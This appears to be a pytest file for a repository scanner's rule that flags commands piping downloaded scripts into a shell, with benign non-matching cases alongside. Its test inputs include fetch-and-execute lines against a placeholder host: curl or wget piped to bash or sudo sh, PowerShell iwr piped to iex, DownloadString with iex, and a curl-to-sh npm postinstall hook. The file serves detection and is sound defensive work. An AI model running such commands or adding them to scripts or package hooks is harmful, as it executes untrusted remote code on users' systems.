from repoguard.scanner import scan_files


def ids(findings):
    return [f.rule_id for f in findings]


def scan_one(path, content):
    return [f for f in scan_files([(path, content)]) if f.rule_id == "SHELL-PIPE-EXEC"]


def test_curl_pipe_bash_in_script_is_high():
    found = scan_one("setup.sh", "curl -s https://example.test/install | bash\n")
    assert len(found) == 1
    assert found[0].severity == "high"
    assert found[0].line == 1


def test_wget_pipe_sudo_sh_is_high():
    assert scan_one("Makefile", "\twget -qO- https://example.test/x | sudo sh\n")


def test_powershell_iwr_pipe_iex_is_high():
    assert scan_one("run.ps1", "iwr https://example.test/p.ps1 | iex\n")


def test_powershell_iex_downloadstring_is_high():
    code = "iex (New-Object Net.WebClient).DownloadString('https://example.test/p.ps1')\n"
    assert scan_one("run.ps1", code)


def test_package_json_script_is_detected():
    content = '{"scripts": {"postinstall": "curl https://example.test/a | sh"}}\n'
    assert scan_one("package.json", content)


def test_readme_install_command_is_only_low():
    found = scan_one("README.md", "curl -sSf https://example.test/install.sh | sh\n")
    assert [f.severity for f in found] == ["low"]


def test_windows_backslash_path_still_works():
    assert scan_one("scripts\\setup.sh", "curl https://example.test/a | sh\n")


# --- benign: these must NOT be flagged ---
def test_curl_download_to_file_is_fine():
    assert not scan_one("setup.sh", "curl -o out.json https://example.test/data.json\n")


def test_curl_piped_to_jq_is_fine():
    assert not scan_one("setup.sh", "curl -s https://example.test/api | jq .name\n")


def test_plain_code_is_fine():
    assert not scan_one("main.py", "print('hello')\n")
